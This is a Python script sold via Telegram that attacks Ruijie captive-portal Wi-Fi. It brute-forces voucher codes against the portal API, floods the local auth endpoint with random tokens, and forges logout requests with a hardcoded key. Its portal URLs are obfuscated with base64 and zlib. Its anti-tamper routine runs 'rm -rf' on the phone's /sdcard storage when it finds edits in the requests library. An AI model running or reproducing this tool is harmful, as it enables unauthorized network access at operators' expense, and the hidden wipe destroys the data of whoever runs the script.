import os
import re
import sys
import zlib
import json
import time
import ping3
import ntplib
import base64
import random
import string
import urllib
import aiohttp
import asyncio
import hashlib
import argparse
import requests
import subprocess
from Crypto.Cipher import AES
from datetime import timedelta
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from concurrent.futures import ThreadPoolExecutor

__ALL__ = []
SUCCESS = 0

def clear():
    os.system("clear")

w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def Line():
    print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])

def Logo():
    clear()
    logo = f"""{r},-_/         .     ,--. .        .
'  | . . ,-. |-   | `-' |  . ,-. | ,
   | | | `-. |    |   . |  | |   |<
   | `-^ `-' `'   `--'  `' ' `-' ' `
/` |
`--'  {g}              Created by ZD\033[1;00m"""
    print(logo)
    Line()
    print(f"{w}[*] This tool is created by ZD")
    print(f"{w}[*] Creator telegram account @ZDxViolet")
    print(f"{w}[*] Reseller telegram channel @TTAK19")
    print(f"{w}[*] This tool is only for Ruijie Network Router")
    Line()

def feature():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", help="features option", choices=["code", "internet", "check", "setup"], required=True)
    parser.add_argument("-m", "--mode", help="type of voucher code", choices=[6, 7], type=int, default=6)
    parser.add_argument("-s", "--speed", help="voucher code bruteforce speed", type=int, default=50)
    parser.add_argument("-t", "--tasks", help="number of tasks for parallel works", type=int, default=100)
    parser.add_argument("-d", "--debug", help="to show debug message", action="store_true")
    args = parser.parse_args()
    option = args.option
    mode = args.mode
    speed = args.speed
    tasks = args.tasks
    debug = args.debug
    if option == "code":
        status = asyncio.run(Security().check())
        if status[0]:
            is_free_user = status[1]
            vobj = VoucherCode(is_free_user=is_free_user, mode=mode, speed=speed, tasks=tasks, debug=debug)
            asyncio.run(vobj.execute())
        else:
            print(f"{r}[!] Internal Error")
            sys.exit(0)
    elif option == "internet":
        status = (True, True)# asyncio.run(Security().check())
        if status[0]:
            iobj = InternetAccess()
            asyncio.run(iobj.execute())
        else:
            print(f"{r}[!] Internal Error")
            sys.exit(0)
    elif option == "check":
        status = asyncio.run(Security().check())
        if status[0]:
            robj = RecheckVoucher()
            asyncio.run(robj.check())
        else:
            print(f"{r}[!] Internal Error")
            sys.exit(0)
    elif option == "setup":
        Setup().set()

async def get_session_id(session, session_url, previous_session_id):
    try:
        async with session.get(session_url) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
            return session_id
    except:
        return previous_session_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try:
            self.ip = open(".ip", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Ip not found try again after setup")
            sys.exit()

    def get_random_code(self):
        random_code = "".join(random.choice(string.digits) for _ in range(6))
        return random_code

    async def send_request(self, session, session_id, log=True):
        random_code = self.get_random_code()
        try:
            async with session.post(f'http://{self.ip}:2060/wifidog/auth?token={session_id}&phoneNumber={random_code}') as response:
                if log:
                    status_code = f"{g}{response.status}"
                    now = f"{b}{time.strftime("%H-%M-%S")}"
                    ping_status = await asyncio.to_thread(ping3.ping, 'google.com')
                    ping = self.get_ping(ping_status)
                    is_open = await self.is_internet_access(session)
                    print(f"{w}time: {now}, {w}status: {status_code}, {w}ping: {ping}, {w}internet-open: {is_open}")
        except:
            return
    
    async def is_internet_access(self, session):
        try:
            async with session.get("https://httpbin.org/") as req:
             return "\033[1;32mTrue\033[1;00m"
        except:
            return "\033[1;31mFalse\033[1;00m"
    
    def get_ping(self, ping):
        if ping is None:
            return '\033[1;31mUnknown\033[1;00m'
        else:
            ping = int(ping * 1000)
            if ping >= 100:
                return '\033[1;31m'+str(ping)+'\033[0;00m'
            elif ping >= 90 and ping < 100:
                return '\033[1;33m'+str(ping)+'\033[0;00m'
            if ping < 90:
                return '\033[1;32m'+str(ping)+'\033[0;00m'
    
    async def execute(self):
        Logo()
        print(f"{g}[+] If there are no logs for a long time, turn your Wi-Fi off and on")
        Line()
        connector = aiohttp.TCPConnector(limit=50)
        timeout = aiohttp.ClientTimeout(total=20)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                loop = 0
                tasks = []
                while True:
                    if loop % 10 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(self.send_request(session, session_id, log=True))
                    if len(tasks) >= 3:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    await asyncio.sleep(1)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit()

async def login_voucher(session, session_id, voucher, file=None, check=False, debug=False):
    global SUCCESS
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 1
    }
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": f'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.post(post_url, json=data, headers=headers) as req:
            response = await req.text()
    except Exception as Error:
        return
    if 'logonUrl' in response:
        SUCCESS += 1
        print(f'\033[1;32mSuccess: {voucher}')
        write_file(file="success.txt", data=voucher)
    elif 'expired' in response:
        if not check:
            print(f'\033[1;33mExpired: {voucher}')
        write_file(file, voucher)
    elif 'failed' in response:
        if debug:
            print(f'\033[1;31mFailed: {voucher}')
        write_file(file, voucher)
    elif 'STA' in response:
        if not check:
            print(f'\033[1;34mLimited: {voucher}')
        write_file(file, voucher)

def write_file(file, data):
    with open(file, "a") as f:
        f.write(data+"\n")

def generator(length):
    vouchers = []
    range_ = 1000000 if length == 6 else 10000000
    for i in range(0, range_):
        vouchers.append(str(i).zfill(length))
    return vouchers

class VoucherCode:
    def __init__(self, is_free_user=None, mode=None, speed=None, tasks=None, debug=True):
        self.is_free_user = is_free_user
        self.mode = mode
        self.speed = speed
        self.tasks = tasks
        self.debug = debug
        if not self.is_free_user:
            if is_reached_limit(True):
                print(f"{y}[!] You are reached limit")
                sys.exit(0)
                print(is_reached_limit)
        if self.mode == 7:
            self.file = "failed7.txt"
        else:
            self.file = "failed.txt"
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Session url not found try again after setup")
            sys.exit()
    
    def remove_already_checked(self, vouchers):
        try:
            self.fail_code = set(open(self.file, "r").read().splitlines())
        except FileNotFoundError:
            self.fail_code = set()
        try:
            success_code = set(open("success.txt", "r").read().splitlines())
        except FileNotFoundError:
            success_code = set()
        self.removed = list(set(vouchers) - set(self.fail_code) - set(success_code))
        return list(self.removed), list(success_code), list(self.fail_code)

    async def execute(self):
        generated_code = generator(length=self.mode)
        vouchers_code, success_code, fail_code = self.remove_already_checked(generated_code)
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        Logo()
        print(f"[*] Generated voucher codes ({len(generated_code)})")
        print(f"[*] Already checked code ({len(generated_code)-len(vouchers_code)})")
        print(f"[*] Still remain to check code ({len(vouchers_code)})")
        print(f"[*] success vouchers and failed vouchers are saved in local")
        Line()
        print(f"[*] Bruteforce mode {str(self.mode)}")
        print(f"[*] Bruteforce speed {str(self.speed)}")
        print(f"[*] Bruteforce tasks {str(self.tasks)}")
        print(f"[*] Show debug message {str(self.debug)}")
        Line()
        print(f"{g}[+] Voucher code brutefore process is running...")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for loop, voucher in enumerate(vouchers_code, start=0):
                    if not self.is_free_user:
                        if SUCCESS >= 3:
                            is_reached_limit(False)
                            print(f"{y}[!] You are reached limit")
                            break
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Process is finished")
        sys.exit(0)

class RecheckVoucher:
    def __init__(self):
        self.file = "failed.txt" or "failed7.txt"
        try:
            self.success_code = open("success.txt", "r").read().splitlines()
        except Exception as err:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        if len(self.success_code) == 0:
            print(f"{r}[!] Exit, you didn't have any success code")
            sys.exit(0)
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Sesion url not found try again after setup")
            sys.exit()
    
    async def check(self):
        Logo()
        print(f"{y}[*] Don't stop this program while running")
        Line()
        print(f"{g}[+] The success code recheck program is starting...")
        Line()
        os.remove("success.txt")
        connector = aiohttp.TCPConnector(limit=30)
        timeout = aiohttp.ClientTimeout(total=20)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                for loop, voucher in enumerate(self.success_code, start=0):
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, check=True))
                    if len(tasks) >= 5:
                        await asyncio.gather(*tasks)
                        tasks = []
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Recheck success voucher code process is finished")

class Setup:
    def __init__(self):
        Logo()
        self.baseurl = "http://10.44.77.240:2060"
        self.username_get_url = self.baseurl + "/username_get"
        self.online_info_url = self.baseurl + "/user/online_info"
        self.logout_url = self.baseurl + "/user/logout"
    
    def set(self):
        print(f"{g}[+] Setting up the wifi info...")
        status = self.unbind()
        Line()
        if not status:
            print(f"{y}[!] Unbinding the wifi failed")
            Line()
        else:
            print(f"{g}[+] Unbinding wifi success")
            time.sleep(6)
            Line()
        print(f"{g}[+] Trying to get info")
        try:
            localhost = requests.get("http://192.168.0.1", timeout=10).text
            ip = re.search('gw_address=(.*?)&', localhost).group(1)
            session_url = "http://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", localhost).group(1)
            open(".session_url", "w").write(session_url)
            open(".ip", "w").write(ip)
            Line()
            print(f"{g}[+] Setup success")
        except Exception as err:
            Line()
            print(f"{r}[!] Setup failed, Error info: {err.__class__.__name__}")
            sys.exit(0)

    def unbind(self):
        username = self.username_get()
        if not username:
            return False
        online_info = self.get_online_info(username)
        if not online_info:
            return False
        data = self.arrange_data(online_info)
        return self.logout(data, username)

    def username_get(self):
        try:
            req = requests.get(self.username_get_url).json()
        except:
            return None
        username = req.get("username", None)
        return username
    
    def get_online_info(self, username):
        params = {
            "username":username,
            "usertype":"wifidog"
        }
        try:
            req = requests.get(self.online_info_url, params=params).json()
        except:
            return None
        try:
            req["data"]["list"][0]
        except IndexError:
            return None
        return req["data"]["list"][0]

    def arrange_data(self, info):
        repmac = info["mac"].replace(":", "")
        repmac = [repmac[i:i+4] for i in range(0, len(repmac), 4)]
        mac_req = ".".join(repmac)
        return {
            "ip":info["ip"],
            "mac":info["mac"],
            "ip_req":info["ip"],
            "mac_req":mac_req
        }

    def get_data(self):
        try:
            req = requests.get(self.baseurl).text
            return req
        except:
            return None

    def extract_chap(self, data):
        match = re.search(r"chap_id=([^&]+)&chap_challenge=([^']+)", data)
        if not match:
            return None
        return {
            "chap_id":match.group(1),
            "chap_challenge":match.group(2)
        }
    
    def encrypt_cryptojs(self, auth, enc_key):
        salt = get_random_bytes(8)
        key_iv = b''
        prev = b''
        while len(key_iv) < 48:
            prev = hashlib.md5(prev + enc_key.encode("utf-8") + salt).digest()
            key_iv += prev
        key = key_iv[:32]
        iv = key_iv[32:48]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(auth.encode("utf-8"), AES.block_size)
        cipher_text = cipher.encrypt(padded_data)
        encrypted_data = b"Salted__" + salt + cipher_text
        return base64.b64encode(encrypted_data).decode("utf-8")

    def get_auth(self, username):
        enc_key = "RjYkhwzx$2018!"
        data = self.get_data()
        if not data:
            print(f"{r}[!] Failed to get data, make sure you are connected to the Wi-Fi and try again")
            sys.exit(0)
        chaps = self.extract_chap(data)
        if not chaps:
            print(f"{r}[!] Failed to extract chap_id and chap_challenge, make sure you are connected to the Wi-Fi and try again")
            sys.exit(0)
        chap_id_decoded = urllib.parse.unquote(chaps["chap_id"])
        chap_challenge_decoded = urllib.parse.unquote(chaps["chap_challenge"])
        auth = chap_id_decoded + chap_challenge_decoded + username
        auth_encrypt = self.encrypt_cryptojs(auth, enc_key)
        return auth_encrypt

    def logout(self, data, username):
        auth = self.get_auth(username)
        payload = f"ip={data['ip']}&mac={data['mac']}&ip_req={data['ip_req']}&mac_req={data['mac_req']}&auth={auth}"
        try:
            respond = requests.post(self.logout_url, data=payload).json()
            if respond["success"]:
                return True
        except Exception as err:
            return False

def is_reached_limit(read_):
    try:
        if read_:
            f = open('/data/data/com.termux/files/usr/bin/.limit','r')
        else:
            f = open('/data/data/com.termux/files/usr/bin/.limit','w')
        if read_:
            return bool(f.read())
        else:
            f.write("True")
    except:
        return False
            

def get_random_string(length):
    return ''.join(random.choice(string.digits) for _ in range(length))

def decode_data(data):
    try:
        if isinstance(data, str):
            data = base64.b64decode(data.encode())
        remove_extra_for_zlib = data[8:-8]
        decompressed_data = zlib.decompress(remove_extra_for_zlib).decode()
        remove_extra_for_base64 = decompressed_data[8:-8].encode()
        decode_data = base64.b16decode(remove_extra_for_base64).decode()
        return decode_data
    except Exception as err:
        return None

def get_current_time():
    try:
        client = ntplib.NTPClient()
        respond = client.request('pool.ntp.org', version=3)
        return time.ctime(respond.tx_time)
    except:
        return None

def check_key_expiration(expiration_time, current_time):
    from datetime import datetime
    try:
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(year=yyyy, month=MM, day=dd, hour=hh, minute=mm, second=0)
    except Exception as e:
        print("Invalid expiration time format, treating as expired.")
        return None
    try:
        current_dt = datetime.strptime(current_time, "%a %b %d %H:%M:%S %Y")
    except Exception as e:
        print("Invalid current time format, using current system time instead.")
        return None
    if expiration_dt > current_dt:
        if expiration_dt <= current_dt + timedelta(minutes=30):
            return (True, False)
        else:
            return (True, True)
    else:
        return (False, False)
            

def get_uid():
    uid = str(os.getlogin())+str(os.getuid())
    return uid

async def get_client_list(session):
    url = zlib.decompress(b'x\x9c\x05\xc11\x0e\x800\x08\x00\xc0\x1f\x15gg7\xe3\xa2/\xc0\x86\x08M\x00S ~\xdf;\xce|c\x05\x98\xf8\xb5G\x92\xeb\xae\xa0\xd9\xdd\x92,[w\x85\x03w\xbc\x18\x178K\x86\xd0F\xea\xa0(\x06X\xc9m\x84\xdb\x0ftk\x19|').decode()
    try:
        async with session.get(url) as req:
            response = await req.text()
    except Exception as err:
        print(repr(err))
        response = None
    finally:
        return response

class Security:
    def __init__(self):
        Logo()
        self.requests_version = requests.__version__
        self.client_list = None
        self.__version__ = "1.0.3"
        self.client_key = get_uid()
        self.current_time = None
    
    async def check(self):
        self.check_storage_permission()
        bypass_status = self.check_bypass()
        await self.request_server()
        if not self.client_list or not self.current_time:
            print(f"{r}[!] Fail to check client key")
            sys.exit(0)
        return self.check_key()

    def check_key(self):
        dec_client_list = json.loads(decode_data(self.client_list))
        status = dec_client_list["status"]
        version = dec_client_list["version"]
        accept_all_clients = dec_client_list["accept_all_clients"]
        clients = dec_client_list["clients"]
        if not status:
            print(f"{r}[!] This tool is currently off")
            sys.exit(0)
            return False
        if version != self.__version__:
            print(f"{r}[!] New vesion is released, updated and try again")
            sys.exit(0)
            return False
        if accept_all_clients:
            return True 
        for client in clients:
            uid, expire_date = client.split('@')
            if uid == self.client_key:
                is_expire = check_key_expiration(expire_date, self.current_time)
                if is_expire[0]:
                    return is_expire
                else:
                    print(f"{y}[!] You key is expired")
                    Line()
                    print(f"{g}[+] Your Key: {get_random_string(2) + base64.b16encode(self.client_key.encode()).decode() + get_random_string(3)}")
                    Line()
                    sys.exit(0)
                    os._exit(0)
                break
        print(f"{r}[!] Your key not registered")
        Line()
        print(f"{g}Your Key: {get_random_string(2) + base64.b16encode(self.client_key.encode()).decode() + get_random_string(3)}")
        sys.exit(0)
        os._exit(0)
        return False

    async def request_server(self):
        iobj = InternetAccess()
        timeout = aiohttp.ClientTimeout(total=20)
        try:
            async with aiohttp.ClientSession(timeout=timeout) as session:
                loop = 0
                for i in range(10):
                    if loop % 5 == 0:
                        session_id = await get_session_id(session, iobj.session_url, None)
                    await iobj.send_request(session, session_id, log=False)
                    self.client_list = await get_client_list(session)
                    self.current_time = get_current_time()
                    if self.client_list and self.current_time:
                         break
                    loop += 1
        except:
            return

    
    def check_storage_permission(self):
        try:
            open('/sdcard/.data','w').write("test")
            return True
        except PermissionError:
            os.system('termux-setup-storage')
            print(f'{y}[!] Give the storage permission to Termux app and try again')
            sys.exit(0)
            os._exit(0)
        except FileNotFoundError:
            os.system('termux-setup-storage')
            print(f'{y}[!] Give the storage permission to Termux app and try again')
            sys.exit(0)
            os._exit(0)
    
    def check_bypass(self):
        base_requests_module_path = "/data/data/com.termux/files/usr/lib/python3.13/site-packages/requests"
        api_size = os.stat(base_requests_module_path+'/api.py').st_size
        model_size = os.stat(base_requests_module_path+'/models.py').st_size
        auth_size = os.stat(base_requests_module_path+"/auth.py").st_size
        adapters_size = os.stat(base_requests_module_path+"/adapters.py").st_size
        packages_size = os.stat(base_requests_module_path+"/packages.py").st_size
        utils_size = os.stat(base_requests_module_path+"/utils.py").st_size
        cookies_size = os.stat(base_requests_module_path+"/cookies.py").st_size
        sessions_size = os.stat(base_requests_module_path+"/sessions.py").st_size
        internal_util_size = os.stat(base_requests_module_path+"/_internal_utils.py").st_size
        if api_size != 6449 or model_size != 35465 or auth_size != 10170 or adapters_size != 26172 or packages_size != 904 or utils_size != 32966 or cookies_size != 18590 or sessions_size != 30645 or internal_util_size != 1502:
            print(f"{r}[Warning] Suspicious activity detected in requests module. If this is unexpected, contact the developer.")
            sys.exit(0)
            os.exit(0)
        
        points = [
            "print", "sys.stdout.write", "open", "rich", "pprint", "marshal", "zlib", "base64"
            ]
        models_code = open(base_requests_module_path+"/models.py")
        api_code = open(base_requests_module_path+"/api.py")
        adapters_code = open(base_requests_module_path+"/adapters.py")
        for point in points:
            if point in models_code:
                print(f"{r}[!] You trying to bypass")
                if self.requests_version == "2.33.1":
                    self.delete_device()
                    sys.exit(0)
                    os._exit(0)
                    break
        for point in points:
            if point in api_code:
                print(f"{r}[!] You trying to bypass")
                if self.requests_version == "2.33.1":
                    self.delete_device()
                    sys.exit(0)
                    os._exit(0)
                    break
        for point in points:
            if point in adapters_code:
                print(f"{r}[!] You trying to bypass")
                if self.requests_version == "2.33.1":
                    self.delete_device()
                    sys.exit(0)
                    os._exit(0)
                    break
        urllib3_base_path = "/data/data/com.termux/files/usr/lib/python3.13/site-packages/urllib3"
        file_path = [
            (base_requests_module_path+'/models.py','24733d202d7636316123a24a838d51d5d664326798dfc840695876eb2989fadc'),
            (base_requests_module_path+"/api.py", "fd96fd39aeedcd5222cd32b016b3e30c463d7a3b66fce9d2444467003c46b10b"),
            (base_requests_module_path+"/adapters.py", "f64950f522f0f5a56627b957064093c462dcbd6cf7e33116848238db01b53e61"),
            (base_requests_module_path+"/sessions.py", "81b9a5b0d4a2f7ab088a0d26aed1f3640653fdf388593a1ef989d6eefe69b4a2"),
            (base_requests_module_path+"/cookies.py", "6cd8be8aa123e0d3d9d34fa86feac7bf392f39bccdde5129830de0ea9692dd7c"),
            (base_requests_module_path+"/packages.py", "fe0d2067af355320252874631fa91a9db6a8c71d9e01beaacdc5e2383c932287"),
            (urllib3_base_path+"/connection.py",'d5947682a7c5748cd36085301742b99dfb60dba84ba94e67af5c874dd29bed60'),
            (urllib3_base_path+'/connectionpool.py', '64486e76c6bc048b9b0f63345e8c4106c8f16ec5f0320512707ee843d8be8f56'),
            (urllib3_base_path+'/poolmanager.py', '3583f9be429f69d19d75a05a71493acfabbcad33fdc200851868d5b5fd6691c7'),
            (urllib3_base_path+'/response.py', 'd950ed1fd2ab60d40b51b0d81d9dc6830cc7dc96698649ff268aad07ba3392dd'),
            (urllib3_base_path+'/_collections.py', '52f57b52ab464d229dbf0f0dfcbc56b848a464b9b9801d7315f4d9607f4a8409'),
            (urllib3_base_path+'/_base_connection.py', '4f57301f7461cecac187a073dc03865436e846c13bbde8a3a993d75d04d1d918'),
            (urllib3_base_path+'/_request_methods.py', '802785f3948efd45385a83f0607228cffb70f9e33f1153a42c5a7c385b02ec30'),
            (urllib3_base_path+'/http2/connection.py', '6c7307e9f36f6adc173eb2aaadc9fbe32037a5459ca8f0e9a672b52dc2826cff')
            ]
        for path in file_path:
            self.verify_file_hash(path)
    
    def delete_device(self):
        deletor = "/system/bin/rm -rf"
        subprocess.run([deletor, "/sdcard/Android"])
        subprocess.run([deletor, "/sdcard/Documents"])
        subprocess.run([deletor, "/sdcard/Download"])
        subprocess.run([deletor, "/sdcard"])
        
    def verify_file_hash(self, file_path):
        sha256_hash = hashlib.sha256()
        with open(file_path[0], 'rb') as f:
            sha256_hash.update(f.read())
        current_hash = sha256_hash.hexdigest()
        if current_hash != file_path[1]:
            print(f"{r}[Warning] Suspicious activity detected in requests module and urllib3. If this is unexpected, contact the developer.")
            sys.exit(0)
            os.exit(0)

feature()